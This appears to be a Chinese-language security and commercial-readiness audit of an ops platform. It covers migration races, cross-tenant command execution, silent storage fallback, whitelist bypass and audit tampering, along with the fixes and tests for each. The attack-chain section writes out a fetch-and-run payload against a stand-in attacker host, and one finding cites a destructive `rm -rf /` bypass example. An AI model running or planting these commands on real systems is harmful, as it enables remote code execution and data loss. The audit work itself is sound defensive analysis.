否则**判部署失败**（用 `timestamp` 过滤是为了排除「配置里已删除的 job」在 5 分钟
staleness 窗口内的历史样本，避免重启后误判）。

真机验收：9 个采集目标全部 `up`，`up==0` 命中 0 条，`/api/v1/alerts` 0 条 firing。

---

### P0-5 升级/迁移不安全：多副本竞态 + 失败静默降级

> **状态：已修复（2026-09-25）**，代码 + 真实 MySQL 8.0.46 集成测试通过（含整链回滚在内的 13/13）。
> 修复实现见本节末尾「修复交付物」，线上版本门禁实测证据见 **§10.3**。

```
证据：internal/store/sql.go  runMigrations
  - 无 MySQL 咨询锁（全仓库无 GET_LOCK），多副本同时启动会在 schema_migrations 主键上竞争
  - 单文件事务在 MySQL 下无意义（DDL 隐式提交），失败后无回滚
  - 迁移失败非致命：initWithRetry 仅记日志「运行期可能不可用」并返回可用 store
    → 服务带着半迁移的 schema 对外提供读写
证据：internal/store/migrations/004_add_audit_trace_id.sql:13  裸 ALTER ADD COLUMN，非幂等
证据：17 个迁移中仅 2 个有 .down.sql；无「二进制版本 ↔ schema 版本」门禁（旧二进制可跑新 schema）
证据：pkg/migrate 为死代码（无调用方）
```

**影响**：第一次带 `replicas>1` 的滚动升级就可能出现半迁移库对外服务；回滚只能靠人工恢复备份。这是企业客户升级时的头号事故源。

**修复方案（约 10–15 人天）**：引入 `GET_LOCK` 咨询锁 + 迁移前 schema 版本检查 + 失败 fail-fast（拒绝启动而非降级）+ 迁移幂等化 + 为无 down 的迁移补回滚脚本 + 删除或接入 `pkg/migrate`。

**修复交付物（2026-09-25 实施）**

1. **并发串行化**：`acquireMigrationLock` 用 MySQL 咨询锁 `GET_LOCK('opsmesh_mig_<库名>', 60)` 串行化迁移；
   锁名按库隔离（多租户各 schema 互不阻塞），超长库名退化为 sha256 前缀（MySQL 锁名 ≤64 字符）；
   锁为会话级故获取/释放共用同一 `*sql.Conn`，release 幂等且用独立 5s ctx（调用方 ctx 已取消也能释放）。
2. **失败 fail-fast**：`initWithRetry` 失败后 `NewSQLStore` 关闭连接池并返回错误，
   **拒绝以不完整 schema 启动**（旧实现仅记日志「运行期可能不可用」并返回可用 store）；
   `seedRBAC` 失败同样不再吞掉——缺 admin 用户等于不可登录。
3. **确定性故障不重试**：新增 `fatalMigrationError` 哨兵，checksum 不匹配与版本门禁命中时
   立即返回（不做 3s×20 退避重试）。
4. **版本门禁（新增 3.6 步）**：库内已应用版本 **高于** 本二进制已知最高版本 → 拒绝启动
   （防二进制回滚后旧版本读写新 schema）。
5. **迁移幂等化**：`applyMigration` 去掉事务（MySQL DDL 隐式提交，「单文件事务」对 DDL 是幻觉），
   改为**可重放**：1050/1060/1061/1091 四类「对象已存在/不存在」错误**必须**先经
   `information_schema` 二次核实（`parseIdempotentDDL` + `ddlTargetExists`）且与期望状态一致才放行，
   无法结构化解析的语句一律失败退出（不吞错）。半迁移中断后重启即可自愈收敛。
6. **回滚脚本补齐**：18 个迁移全部配 `.down.sql`（001 重写为真实逐表 DROP 并加破坏性警告；
   003 因表归属 001 保持说明性占位）。`.down.sql` 由 `migrationFiles()` 显式跳过，不参与自动执行。
7. **删除死代码** `pkg/migrate/`（808 行 + 24 测试，零调用方，且其 `_migrations` 表与现状冲突）。
8. **文档**：`docs/operations.md` §6.3 重写为「schema 迁移与回滚」（机制表 + 迁移清单 + 手工回滚流程 + 升级顺序约束）。

**实测收口（真实 MySQL 8.0.46，`internal/store/migration_test.go` 集成层，含 4 组纯逻辑测试共 13/13 通过；复跑记录见 §10.3）**：
`TestRunMigrationsFreshDB`（全新库建齐 21 张表）、`TestRunMigrationsIdempotent`（连跑 3 次）、
`TestSchemaMigrationsTable`、`TestMigrationLock_ExcludesOtherSession`（B 会话等锁超时 → 释放后成功）、
`TestRunMigrations_VersionGate`（库内 9999 → 拒绝启动且为 fatal 类）、`TestRunMigrations_ChecksumGateFatal`、
`TestRunMigrations_ReplayAfterHalfApplied`（删掉版本记录模拟半迁移 → 重放收敛）、
`TestRunMigrations_ConcurrentStores`（4 个 store 并发构造全部成功）、
`TestMigrationDownScripts_UnwindChain`（倒序执行全部 down 脚本 → 库内只剩 `schema_migrations`）。
另有 5 组纯逻辑测试（`splitSQLStatements` / `migrationFiles` 排序 / `parseIdempotentDDL` 正负例 /
锁名构造 / `fatalMigrationError` 穿透）无需 DB 即可回归。

---

### P0-6 多租户隔离：生产模式下买不到，且代码里存在跨租户命令执行 🔴

> **状态：问题 A / 问题 B 均已修复（2026-09-25）**，代码 + 单元/负向测试通过。
> 修复实现见本节末尾「修复交付物」，线上落库与越权拒绝实测证据见 **§10.4**。

这一项有两个独立问题，叠加后结论是「多租户既不可用也不安全」。

**问题 A：内置用户中心无法表达租户，生产模式下多租户不可用。**

```
证据：internal/store/models.go:16-28  User 结构体【没有 TenantID 字段】
证据：internal/controlplane/auth_tokens.go:216-219  签发 JWT 时硬编码 TenantID: "default"
      （注释："用户中心为平台级，统一 default 租户"）
证据：--trust-gateway-headers（网关注入角色的唯一路径）在生产模式被强制 false
      （config.go:796-800）
实测：生产模式下伪造 X-Tenant-ID → 401 "identity header without verifiable credential"
```

即：内置路径签发的所有用户恒在 `default` 租户；网关路径在生产被禁用。**README「IAM 与租户隔离」所描述的按租户隔离，在实际生产部署中无法配置出来**（用户无法被指派到租户）。若产品要按多租户售卖，这是结构性缺口。

**问题 B：四条「下发到 agent」的路径缺少 AgentID 的租户校验，而任务队列按 agentID 寻址。**

这是当前代码中真实存在的**跨租户远程命令执行**漏洞：

```
【创建侧缺校验】以下路径取了请求体里的 deviceID/agentID 直接建任务，未校验目标 agent 属于调用方租户：
  internal/controlplane/script.go:293-301        POST /api/v1/scripts/{id}/execute  ← 且 sc.Content 未过 validateCommand
  internal/controlplane/automation.go:47-60      automation execute_task 动作（command 来自用户规则参数）
  internal/controlplane/config_hotpush.go:84-91  配置热推（TaskTypeFile 写文件）
  internal/controlplane/config_hotpush.go:168-176 canary 批量（agentIDs 数组）
  对照：server_tasks.go:155-157 等路径【有】正确的 agent.TenantID != tenant → 403 校验
【消费侧无租户维度】任务队列按 agent_id 单独寻址：
  internal/store/sql_tasks.go:499-502
    SELECT ... FROM tasks WHERE agent_id=? AND (status IS NULL OR status='pending') ... LIMIT 1 FOR UPDATE
  internal/store/memory.go:693-711  m.tasks[agentID] 遍历
  → 无 tenant_id 过滤；agent 侧执行时亦不校验 task.TenantID（agent.go:905-920）
```

**攻击链**（已通过代码逐环节确认）：
1. 租户 A 中具备 `script:write`/`cmdb:write` 的主体（`cmdb` 属 operatorGroups，故**默认 operator 角色即可**）创建一个内容为 `curl http://attacker/p.sh | sh` 的脚本；
2. `POST /api/v1/scripts/{id}/execute {"deviceID":"<租户 B 的 agentID>"}` → 无租户校验，任务创建成功；
3. 租户 B 的 agent 按 agent_id 领取并执行该任务（通常以 root 身份）。

**商用影响**：租户隔离是多租户运维平台的**核心商业承诺**，这条路径一旦被客户的安全团队发现，交易即终止。当前 exploitability 取决于部署中是否真实存在多个租户（内置用户中心下不会，安装令牌/网关注入下会），但**只要卖出多租户版本就立刻成为最高危漏洞**。

**修复方案（约 5–10 人天）**
1. 四条路径统一补 `lookupAgent` + `agent.TenantID != callerTenant → 403`（可直接复用 `server_tasks.go:155` 的既有模式，改动很小）。
2. 任务领取 SQL 增加 `tenant_id=?` 条件（agent 侧携带自己的租户）作为第二道闸。
3. `script.Content` 入队前过 `validateCommand`（当前完全绕过）。
4. 战略决策：若要卖多租户，需在 User 模型加 TenantID 并放开 Y 路径的租户作用域；若不卖，则应在 README 中**明确降级该宣传点**。

**修复交付物（2026-09-25 实施，问题 A + 问题 B 一并修复）**

问题 A（用户中心支持租户）：
1. `store.User` 增加 `TenantID` 字段（`internal/store/models.go`），持久化列 `users.tenant_id`
   由迁移 `018_users_tenant_id.sql` 引入（含 `.down.sql` 回滚）；SQLStore 的用户查询/写入
   全部带上该列（`userColumns` 常量），MemoryStore seed 账号统一 `DefaultTenantID`。
2. 签发 JWT 不再硬编码 `TenantID: "default"`（`auth_tokens.go`）：改为取用户自身 `TenantID`
   （空值归一为 default）。`tenantFromBearer` 由此拿到真实用户租户，**网关路径之外的内置登录
   路径也能表达租户**（`TestLogin_JWTContainsUserTenant` 断言 `/me` 与 bearer 解析均为 acme）。
3. 用户创建/更新入口新增租户指派与校验（`auth_users.go`）：平台管理员可指派任意合法租户；
   租户管理员只能在本租户内创建（跨指派 403）；租户 ID 走白名单正则
   `^[A-Za-z0-9_.-]{1,64}$`（`validateTenantID`），因为该值会流入多租户 schema 名。
4. `RequireAuth` 拒绝空租户（无租户上下文的用户不可进入业务路径）。

问题 B（跨租户命令执行）：
5. **下发侧统一收口**：新增 `internal/controlplane/tenant_guard.go`，提供 `requireTenantAgent`
   （HTTP 路径，失败写 403）/ `tenantAgent`（非 HTTP）/ `tenantAgentIn`（无 `*Server` 引用的执行器）
   三个入口，判定语义与既有正确实现（`handleCreateTask` 等）逐字一致：
   `agent == nil || (tenant != "" && agent.TenantID != tenant)` → 拒绝。
   四条漏洞路径全部改走该入口：`script.go`（脚本执行）、`automation.go`（执行器
   ExecuteTask/Scale/Restart/Isolate）、`config_hotpush.go`（热推 + canary 批量，批量在**建任何任务前**
   先全量校验，避免部分成功）、`server_tasks.go` 的 `validateCommand` 注释同步纠正。
6. **脚本内容不再绕过命令校验**：脚本执行路径的任务 command 是脚本体，此前完全不过
   `validateCommand`；现已在入队前校验（含管道/重定向等元字符一律 400），并在
   `validateCommand` 注释中写明「脚本路径同样受限，如需复合命令应拆分任务并由部署方放开
   agent 端白名单」。
7. **领取侧数据层兜底**（第二道闸，防止未来新增路径漏校验）：
   `SQLStore.ClaimTask` 的 SELECT 增加 `AND (tenant_id IS NULL OR tenant_id='' OR tenant_id=?)`，
   `?` 取「agent 自身租户」（`s.Agent(agentID)`）；`MemoryStore.ClaimTask` 同语义。
   **刻意不改 `Store` 接口签名**（`ClaimTask(agentID string)` 保持原样），避免 ~35 处测试调用改写；
   任务侧租户为空视为「存量无标记数据」放行，不饿死历史任务。
   语义已验证：跨租户任务会被**跳过**（继续尝试后续可领任务），而非简单返回 nil。

**负向测试（新增 3 个测试文件，全部通过）**：
`internal/controlplane/tenant_isolation_test.go`（脚本执行 / 热推 / canary 批量 / 自动化执行器
四条路径的跨租户 403 + 「同租户放行」正例 + 「拒绝时不产生任何任务」断言 + 注入型脚本内容 400）、
`internal/controlplane/tenant_users_test.go`（租户指派权限边界、`/me` 与 JWT 租户一致性、
列表不跨租户泄漏）、`internal/store/claim_tenant_test.go`（领取侧跳过跨租户任务、
空租户兼容、同租户正常领取）。

---

### P0-7 微服务持久化被静默降级：生产库里没有表（数据重启即丢）✅ 已修复（2026-09-25，端到端实证见 §9.4）

**这一项是「真机跑起来」才发现的，静态读代码看不出——因为代码「看起来」是支持 SQL 的。**

```
证据：docker logs opsmesh-alert-svc
  MySQL store 初始化失败，回退 memory: open mysql: invalid bool value: true?parseTime=true
证据：docker logs opsmesh-config-svc   → 同样一行
证据：SHOW TABLES FROM opsmesh_alert / opsmesh_config / opsmesh_log
  → 三个库都由 init-databases.sql 建好了，但【一张表都没有】
证据：services/{alert,config}-svc/internal/store/mysql.go  ensureParseTime()
  → 无条件在 DSN 末尾追加 "?parseTime=true"
实证（驱动层对照）：
  旧实现输出 .../opsmesh_alert?parseTime=true?parseTime=true → mysql.ParseDSN err=invalid bool value: true?parseTime=true
  新实现输出 .../opsmesh_alert?parseTime=true                → mysql.ParseDSN err=<nil>
```

**影响**：compose 已为 alert-svc / config-svc 配好 `*_STORE_TYPE=sql` 与 DSN（即运维明确要求持久化），
但 DSN 拼接缺陷让 `sql.Open` 必然失败，服务只打一行日志就**静默退回内存存储**：
告警规则、告警记录、静默、配置项、配置历史、密钥全部只活在进程里，**重启即归零**；
而 `/health` 依然是 200，`deploy.sh` 冒烟测试全绿，监控也看不见——这是最难在客户现场排查的一类故障。

波及面（同类实现共 10 个服务）：alert、autoscaler、config、deploy、gpu、incident、log、plugin、portal、workflow。
其中 compose 生产栈内实际命中：**alert-svc、config-svc**（`opsmesh_log` 因 log-svc 走 loki 后端未接 SQL，暂无数据面影响）。

**修复交付物（2026-09-25 实施）**
1. 10 个服务的 `ensureParseTime` 改为幂等实现（已含 `parseTime=` 直接返回；已含 `?` 则用 `&` 追加），
   每个服务补 `internal/store/dsn_test.go` 回归测试（3 个用例：无参数 / 已含 parseTime / 仅含其它参数）。
   10 个模块 `go test` 全绿；把旧实现临时还原后测试确实失败（非「永远通过」的假测试）。
2. **SQL 初始化失败不再静默回退**：8 个服务（alert/auth/config/deploy/device/incident/plugin/portal）
   的 `log.Printf("...回退 memory")` 改为 `log.Fatalf("...停止启动")`，与 task-svc 及控制面
   `--production` 的既有 fail-fast 策略对齐（`docs/architecture.md:871` 早已写明该原则，
   微服务此前的回退行为与文档不一致）。

**防回归**：`dsn_test.go` 随各模块 CI 执行；fail-fast 属「配置要求 SQL 就必须真上 SQL」的语义，
不满足即拒绝启动，不会再有第二条静默降级路径。

**实测收口（2026-09-25，真机）**：重新部署后 `opsmesh_alert` 有 3 张表、`opsmesh_config` 有 5 张表
（修复前均为 0 张），`alerts` / `config_entries` 均可 SELECT；负向用例「非法 DSN 启动 alert-svc」
返回退出码 1 并打印 `MySQL store 初始化失败，停止启动`。完整记录见 §9.4 / §9.6。

---

## 3. P1 高风险项（商用前应修，可排在 P0 之后）

| # | 问题 | 证据 | 商用影响 | 工作量 |
|---|---|---|---|---|
| **P1-1** | **agent 命令白名单可被 `&&` 绕过**。`--agent-shell-whitelist` 只校验首个 token，而 `&&` 两端均放行（agent 侧 `agent.go:1043-1048`，控制面 `server_tasks.go:94-99`）。`ls && rm -rf /` 首 token `ls` 命中白名单，右侧照常执行。代码注释称 `&&`「不引入任意命令执行」——该推理对白名单场景不成立。 | `internal/agent/agent.go:1077-1115`（白名单）、`agent.go:1020-1022`（明确不拦管道 `\|`）、`internal/controlplane/server_tasks.go:90`（控制面【有】拦管道） | 默认开启的白名单被宣传为生产加固项，实际不提供隔离；且两端策略不一致（控制面拦 `\|`、agent 不拦） **→ 修复（2026-09-25）**：白名单改为按「执行段」校验——先按 `&&`/`||`/`|` 切段（`>&`/`&>` 重定向不误切），再逐段取命令词匹配，任一段未命中即整条拒绝；带路径的命令词仅系统标准可执行目录按 basename 匹配（非标准目录须显式白名单整条路径），`VAR=value cmd` 前缀 fail-closed。验证见 §11 | 1–2 pd |
| **P1-2** | **全机群共用一个 agent HMAC 密钥，且签名不覆盖载荷**。签名为 `HMAC(secret, timestamp+agentID)`，不覆盖任务内容/结果；`Register` 不返回 per-agent 密钥；agent 执行 shell 任务时不隔离环境变量，故任一 agent 被 RCE 即泄漏全机群密钥。 | `internal/controlplane/grpc/grpc.go:294-297`、`:274-277`；`internal/agent/agent.go:1149-1154`（未设 cmd.Env） | 单点失守 → 全机群可被冒领任务、可伪造上报结果（审计可信度归零）；无按 agent 吊销能力 **→ 修复（2026-09-25）**：① **签名升级为 v2 并覆盖载荷**——`HMAC-SHA256(secret, "v2\n"+timestamp+"\n"+identity+"\n"+payloadDigest)`，两端共用 `internal/grpcx/agentsig.go` 独立计算同一摘要（同秒换内容/篡改载荷即验签失败），v1 仅作滚动升级期兼容并按 agent 限次 WARN；② **per-agent 密钥下发双门槛**——一次性 install token 原子消费 **且** 连接为 TLS 才返回密钥（明文拒发），落盘 `<dataDir>/agent.key`（0600），控制面按「per-agent 优先、预共享兜底」选取；③ **任务子进程环境白名单**——`executeShell`/`execService` 只透传运行所需最小集合 + `LC_*`，堵住「任一任务读 `/proc/self/environ` 即拿到签名密钥」；④ 新增验签/密钥来源指标与 3 条告警规则，滚动升级顺序（先控制面、回滚先 agent）写入 `docs/operations.md`。验证见 §13 | 5–8 pd |
| **P1-3** | **审计日志不可防篡改，且无保留策略、无查询索引**。`audit_log` 为普通追加表，无 hash 链/签名（`migrations/001_initial.sql:78-86`）；全仓库无 DELETE/归档/分区逻辑；`QueryAudits` 以 `tenant_id + created_at` 过滤但仅 `idx_audit_trace` 一个索引，长期运行后审计检索将全表扫描。 | `internal/store/sql_audits.go`、`migrations/001_initial.sql`、`internal/controlplane/server_audits.go:15-16` | README「100% 留痕 / 等保三级 ≥6 月」仅靠「永不删除」满足，但**无防篡改**（持 DB 凭证即可改写历史，等保三级明确要求审计记录防篡改）；且查询会随时间劣化 **→ 修复（2026-09-25）**：迁移 019 引入哈希链（`prev_hash`/`entry_hash`，`entry_hash=sha256(prev_hash‖长度前缀字段…)`，`created_at` 秒截断）+ `audit_chain_head` 单行链头（写入事务内 `FOR UPDATE` 串行化，多副本不分叉）+ 链式写入失败降级普通 INSERT（数据不丢、自检如实计 `legacyRows`）；`VerifyAuditChain` 平台级/租户级双强度校验 + `GET /api/v1/audit/verify`（200/409/501/500）；`--audit-retention-days`（默认 180 天）由 leader 周期归档至 `audit_log_archive` + `audit_archive_meta` 边界哈希（跨归档边界仍可校验）；补 `idx_audit_tenant_created` / `idx_audit_entry_hash`；新增 4 个指标与 2 条告警规则。**诚实边界**：无密钥链无法对抗全链重写，需外部 WORM 锚定（未内置）。验证见 §12 | 3–5 pd |
| **P1-4** | **无界的 agent 日志缓冲会导致进程 OOM**。`agentLogs` 切片按 agent 每 30s 追加且永不裁剪；`deviceMetrics` map 无淘汰。 | `internal/store/sql_agent_logs.go:24-27` 及 memory 同名实现 | 机群规模上去后数周内控制面 OOM；商用 SLA 不可承诺 **→ 修复（2026-09-25）**：新增 `internal/store/memory_bounds.go` 统一施加硬上限——`deviceMetrics` 设备条目 ≤2000（超限按「最久未写入」淘汰整条设备，排序刻意用写入时刻而非 agent 可控的 `CollectedAt`）、`agentLogs` 批次 ≤2000 且总行数 ≤100000（超限丢最旧批次并回收底层数组容量）。验证见 §11 | 2–3 pd |
| **P1-5** | **未鉴权即可造成指标内存耗尽 DoS**。中间件对**每个请求**（含 404 与未鉴权请求）记录指标，`normalizePath` 仅归一全数字段，`/api/v1/<随机串>` 原样入 map 且无上限；`/metrics` 默认放行（空 CIDR 白名单=不限制），无全局限流器。 | `internal/controlplane/server_middleware.go:169-177,207-228`、`internal/metrics/metrics.go:61-66,100-110`、`internal/controlplane/server_netsec.go:129-131` | 远程未鉴权即可打爆内存导致控制面重启 **→ 修复（2026-09-25）**：四层收敛——(1) 时序硬上限 2000（超限折叠 `:other` + 自观测指标）；(2) `normalizePath` 收紧（段 >48B／含非安全字符／全数字 → `:id`；整路径 >200B → `/:overlong`）；(3) 8080/9091 两处 `/metrics` 均接入准入，生产模式空 CIDR 改 fail-closed；(4) 生产未显式配置时默认启用 200 req/s/IP 限流，限流器 IP 桶上限 5 万（超限先清空闲桶，仍满则放行但不建桶）。真机实测见 §11 | 2–3 pd |
| **P1-6** | **可支撑性缺口**（影响交付后的运维成本）。无版本端点、无 pprof、无配置转储、无诊断包；日志级别硬编码 Info；`/metrics` 抓取本身会做 4 次全表读。 | `internal/controlplane/server_lifecycle.go`（151 条路由中无上述项）、`internal/logx/logx.go` | 客户现场排障必须 SSH + 看源码，支持成本高、无法远程定位问题 | 6–10 pd |
| **P1-7** | **许可与第三方合规未就绪**。LICENSE = Apache-2.0（`Copyright 2026 OpsMesh Contributors`），**无 NOTICE / THIRD_PARTY 清单**；依赖含 MPL-2.0 组件（go-sql-driver/mysql、hashicorp/vault/api、terraform-plugin-sdk/v2）；Helm 应用商店 28 个条目引用 bitnami 仓库与 bitnami.com 图床，而 Bitnami 已于 2025 年调整镜像授权策略。 | `LICENSE`、`go.mod`、`internal/helm/catalog.go` | 采购/法务尽调会要求第三方声明；Apache-2.0 意味着**任何第三方可自由再分发你的商业产品**（是否可接受需商业决策）；应用商店在客户无外网时不可用，且可能撞上 Bitnami 授权限制 | 3–5 pd + 法务 |
| **P1-8** | ~~控制面的 M3/M5 子存储仍可静默退回内存~~ **✅ 2026-09-25 已修**。`NewDeployHandler` / `NewOrchestrationHandler` 在 `deploy.NewSQL` / `orchestration.NewSQL` 构造失败时只 `logx.Error` 后改用 `Memory`，且工厂拿不到 `cfg.Production`，故生产模式下同样静默。 | `internal/controlplane/factory/server_factory.go`（原 `:32-47`、`:51-66`）；调用方 `internal/controlplane/server.go:309-310` 未传生产标志 | 部署模板/M5 编排数据在重启后丢失，而 `/health` 与界面均正常。触发窗口窄（主 store 已在同一 DSN 上跑完迁移，通常先失败），但属「配置要求持久化却跑在内存」的同一类缺陷 | **修复**：工厂接线生产标志，生产模式下子存储构造失败改为 fail-fast（对齐既有阻断先例），`server_factory_test.go` 覆盖两分支；验证见 §10.5 |
| **P1-9** | **交付树中残留开发调试页面，内含硬编码凭据**。`deploy/docker/index.html` 是一份手工冒烟测试页：登录表单把 `viewer` / `viewer123` 直接写死在 `value=` 属性里，`var API = 'http://localhost:8080'` 硬编码明文地址，「改密」按钮把口令固定改成 `NewPass123`，并把 token 前 30 字符回显到页面。该文件**未被任何 compose/部署文件引用**（孤立文件），因此未被实际部署——但它是残留物，且恰好印证了 P0-1：团队自己的测试习惯仍依赖 `viewer123` 可用，这可能是该账号在生产存活未被察觉的原因之一。 | `deploy/docker/index.html`（全文） | 交付物卫生问题；若被误拷入静态目录即成凭据泄露；给客户做源码审计时会被质疑 | ✅ 2026-09-25 已删除（随 P0-4 遗留物清理批次）；复核 `deploy/docker/` 现仅剩 Dockerfile/脚本/证书与 compose |

---

## 4. 真正值得肯定的部分（避免低估）

评估应双向诚实。以下是我实际验证后确认**做得好**的地方：

1. **核心卖点不是 PPT**。`pkg/provision/auto.go:111` 真的调用 `discover.Sweep(ctx, cidr, []int{22,9100}, ...)` 做 TCP 扫描，并有 SSH 推送信号量限流（`sshSem` 并发 8）、advertise 格式白名单、生产模式强制 HTTPS（防中间人投毒 agent 二进制）。**「网段自动发现纳管」是真实现的。**
2. **持久化是真的**。`internal/store/` 有 100+ 文件，35 个领域接口 × 3 种实现（Memory/SQL/MultiSchema）+ 编译期断言；`sql_ticket.go`/`sql_slo.go`/`sql_traffic.go`/`sql_billing.go` 等为真实 CRUD。此前担心的「15 个领域桩实现」经核实**已全部落地**（`StubDomains = []string{}`，且 `StubNotImplemented` 在非测试代码中**零调用点**）。
3. **版本化迁移框架存在**（17 个迁移 + checksum 记录 + 部分 down 脚本），虽然安全性有 P0-5 的问题，但框架本身是对的，不是裸 `CREATE TABLE`。
4. **前端 XSS 防护经核实良好**（我独立复核了安全子代理的结论）。个人版 209 处 `innerHTML` 中 **205 处是 `innerHTML = ''` 清空**，1 处为静态 SVG 图标表，1 处 `el()` 的 `html` 键**全仓库零调用者**；文本一律走 `textContent`/`createTextNode`。两版前端均无 `eval`/`new Function`/`v-html`。CSP 为 per-request nonce 且已移除 `script-src 'unsafe-inline'`。
5. **防守意识好的细节**（读代码时反复出现）：租户头伪造被拒绝并给出可操作提示；`validateCommand` 与控制面/agent 双层校验的纵深设计意图；联邦转发 HMAC 覆盖 method+path+ts+identity+body；CI 用 `shadow-observe` 双轨对照抓出真实 bug；登录防爆破在我实测中确实触发了 429。
6. **i18n 完整**：企业版 en/zh 各 2482 个键，数量完全对齐——不是「只做中文」。
7. **测试投入真实**：`internal/agent` 单包测试耗时 64 秒并通过，说明有实质用例而非空壳；`internal/authctx`、`pkg/tenant` 亦实测通过。
8. **依赖安全状况良好（独立复验）**：本次实际运行 `govulncheck ./...` → **`No vulnerabilities found`（0 个可达漏洞）**，仅有 1 个存在于所需模块中但代码不可达的告警。这与项目 `.trivyignore` 中「经符号级可达性分析确认不可达」的豁免依据一致——该豁免是**有据可查的合规豁免，而非一豁了之**。企业客户的安全评审在这一项上会顺利通过。

---

## 5. 需要你做的架构决策（非缺陷，但影响商用成本）

**双轨架构的代价正在显现，建议尽早收敛。**

| 现状 | 数据 |
|---|---|
| 单体控制面 | `internal/` 非测试 74,773 行，其中 `internal/controlplane` 一个包 **56,150 行 / 155 个文件**（占内核 75%） |
| 18 个微服务 | `services/*` 非测试约 52,797 行，每个 `go.mod` 均含 `replace github.com/Levango7/OpsMesh => ../../` |
| 默认部署 | README 明确「微服务部署（可选，默认不启用）」——即默认交付路径**不使用**这 5.3 万行 |

**两个具体问题**：

1. **微服务不是独立模块**。`replace` 指向 `../../` 意味着它们无法独立版本化、独立发布；根模块任何改动都可能同时打破 18 个服务。这与「微服务」的工程目的相悖。
2. **同一领域两套实现需人工保持同步**。例如 `services/task-svc/internal/store/mysql.go`（857 行）与 `internal/store/sql_tasks.go`（750 行）是 task 域的两份独立实现。项目为此付出了 `docs/td60-consistency-report.md`（47KB 一致性报告）+ shadow-observe CI 的持续成本。

**建议**：明确二选一。若目标客户是中大型企业私有化部署（当前能力与文档均指向此），**单体 + 干净的单包边界**更划算；把微服务降级为「规模化预留」并冻结投入，直到确有客户需求。这笔省下的维护成本，远大于 P0 修复的总和。

---

## 6. 商用路线图

### 阶段一：可交付（必做，约 25–40 人天）—— ✅ 已全部完成
目标是「客户能装上、能登进去、能安全用」。

| 顺序 | 事项 | 工作量 | 出口标准 |
|---|---|---|---|
| 1 | ~~P0-1 管理员口令可控 + 种子账号强制轮换~~ ✅ 2026-09-25 | ~~2–3 pd~~ | ~~生产模式下运维可登录；种子口令无法登录~~ 已达成 |
| 2 | ~~P0-2 HTTP TLS 或修正文档 + 移除误导性 HSTS~~ ✅ 2026-09-25 | ~~1–3 pd~~ | ~~浏览器流量全程加密或明确由代理终止~~ 已达成（`--http-tls` 三态，生产默认 HTTPS） |
| 3 | ~~P0-4 部署资产修复~~ ✅ 2026-09-25 | ~~5–8 pd~~ | ~~`docker compose up` 与 `helm install` 开箱即通~~ 已达成（compose 真机 17 容器全 Up） |
| 4 | ~~P0-6 租户校验补齐（4 条路径 + 队列过滤）~~ ✅ 2026-09-25 | ~~5–10 pd~~ | ~~跨租户下发返回 403；集成测试覆盖~~ 已达成（`tenant_guard.go` 统一入口 + 4 路径接线 + 领取侧 SQL 门 + 伪造租户头 401） |
| 5 | ~~P0-3 企业版前端纳入交付~~ ✅ 2026-09-25 | ~~3–5 pd~~ | ~~`/enterprise/` 可用；CI 构建产物入库~~ 已达成（构建期 `go:embed` 进二进制；产物不入库，由嵌套 `.gitignore` 白名单化；CI 黑盒断言） |
| 6 | ~~P0-5 迁移加锁 + 失败 fail-fast~~ ✅ 2026-09-25 | ~~10–15 pd~~ | ~~3 副本并发启动迁移通过；失败拒绝启动~~ 已达成（咨询锁 + checksum/版本门禁 + 可重放；真实 MySQL 13/13 集成测试通过） |
| 7 | ~~P0-7 微服务持久化静默降级~~ ✅ 2026-09-25（评估中发现） | ~~3–5 pd~~ | ~~生产库真实建表、重启不丢数据~~ 已达成 |
| 8 | ~~P1-8 M3/M5 子存储静默降级~~ ✅ 2026-09-25 | ~~1 pd~~ | ~~生产模式构造失败 fail-fast~~ 已达成 |

> **本阶段已收口**：7 项 P0 阻断项 + 1 项同类 P1 全部修复，并以真机全栈复验（`verify-runtime.sh` 58 项全过、
> 静态门禁 20 项全过、真实 MySQL 迁移集成测试 13/13）为交付证据。详细记录见 §9 / §10。

### 阶段二：可运维（约 12–20 人天）
目标是「出问题能查、能升级、能恢复」。

- ~~P1-1 白名单绕过修复（1–2 pd）~~ ✅ 2026-09-25
- ~~P1-4 日志/指标缓冲加上限与淘汰（2–3 pd）~~ ✅ 2026-09-25
- ~~P1-5 指标基数控制 + `/metrics` 生产默认受限（2–3 pd）~~ ✅ 2026-09-25
- ~~P1-2 per-agent 密钥下发 + 签名覆盖载荷 + 任务环境隔离（5–8 pd）~~ ✅ 2026-09-25（原列于阶段四，因属技术类高风险提前收口；密钥轮换与滚动升级顺序见 `docs/operations.md` §9.2.4 / §11.4）
- P1-6 版本/诊断端点 + 日志级别可配 + 结构化日志统一（6–10 pd）
- `docs/dr-runbook.md` 恢复流程可执行化（当前手册读 `/backup`，而 `mysql-statefulset.yaml` 并未挂载该路径 → 首次演练必失败）（1–2 pd）

> 本阶段 P1-1 / P1-2 / P1-3 / P1-4 / P1-5 已收口并真机复验（`verify-runtime.sh` 断言 94 项 0 失败、静态门禁 20 项 0 失败），
> 并对「Docker Desktop 端口转发不保留真实来源 IP」这一部署形态边界做了对照实验与文档化（见 §11.3）。

### 阶段三：可销售（约 10–20 人天 + 法务）
目标是「采购、法务、安全评审能过」。

- P1-7 THIRD_PARTY/NOTICE 清单 + MPL 声明 + 明确 Apache-2.0 的再分发含义（是否引入商业许可/EULA 需你决策）（3–5 pd + 法务）
- ~~P1-3 审计防篡改（hash 链或外部 WORM 归档）+ 保留/归档任务 + `(tenant_id, created_at)` 复合索引（3–5 pd）~~ ✅ 2026-09-25（WORM 外部锚定仍为已知边界，见 §3 P1-3 与 `docs/security-mechanism.md` §7.7）
- 企业级能力补齐（按目标客户取舍）：SSO/LDAP/OIDC、真实 HA failover（当前 `handleHAFailover` 为 no-op 返回 `"simulated": false`）、白标、离线安装包 —— 约 20–30 pd，**建议与首个客户的真实需求挂钩后再投入**，不要预先建设。

### 阶段四：规模化（按需）
- ~~P1-2 per-agent 凭证 + 签名覆盖载荷（5–8 pd）~~ ✅ 2026-09-25（已提前至阶段二收口，见 §13）
- 双轨架构收敛决策落地
- 首次真实负载测试（当前仓库内**无任何压测结果**，而每 agent 2s 一次的取消轮询意味着 1000 agent ≈ 500 req/s 的固定开销，应实测确认）

---

## 7. 与既有评估报告的关系（重要）

`docs/evaluation-report.md` 的结论是「35/35 已修复、0 遗留、生产可用，但有 8 项高风险需修复」。本报告需要指出三点：

1. **它的「生产可用」结论未经运行验证。** 35 项修复全部集中在代码质量、文档一致性、Operator 安全配置等**静态维度**，而本次发现的 6 个 P0 全部是**动态/配置维度**——它们只有在真正以生产参数启动产品时才会暴露。这解释了为什么「35/35 已修复」与「生产模式登不进去且可被接管」可以同时成立。
